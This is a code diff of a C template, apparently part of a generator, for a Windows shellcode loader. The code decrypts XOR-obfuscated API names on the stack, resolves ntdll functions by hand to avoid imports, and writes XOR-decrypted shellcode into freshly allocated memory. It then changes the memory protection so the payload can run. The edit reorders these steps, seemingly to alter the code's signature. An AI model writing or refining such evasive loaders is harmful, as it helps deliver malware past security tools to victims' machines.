@@ -105,20 +105,15 @@ void _start() {{
     SIZE_T key_len = sizeof(key);
 
     unsigned char stackbuf[{stackbuf_size}];
-
-    char* ntdll_dll = (char*)&stackbuf[{offsets[0]}];
     for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
         stackbuf[i] = enc_strings[i] ^ key[i % key_len];
 
+    char* ntdll_dll = (char*)&stackbuf[{offsets[0]}];
     HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
     char* ntallocatevirtualmemory = (char*)&stackbuf[{offsets[1]}];
     NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
         (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
-
-    char* ntprotectvirtualmemory = (char*)&stackbuf[{offsets[2]}];
-    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
-        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
 
     LPVOID execMemory = NULL;
     SIZE_T regionSize = size;
@@ -131,9 +126,12 @@ void _start() {{
         PAGE_READWRITE
     );
 
-    unsigned char* dst = (unsigned char*)execMemory;
     for (SIZE_T i = 0; i < size; i++)
-        dst[i] = shellcode[i] ^ key[i % key_len];
+        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];
+
+    char* ntprotectvirtualmemory = (char*)&stackbuf[{offsets[2]}];
+    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
+        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
 
     ULONG oldProtect;
     pNtProtectVirtualMemory(
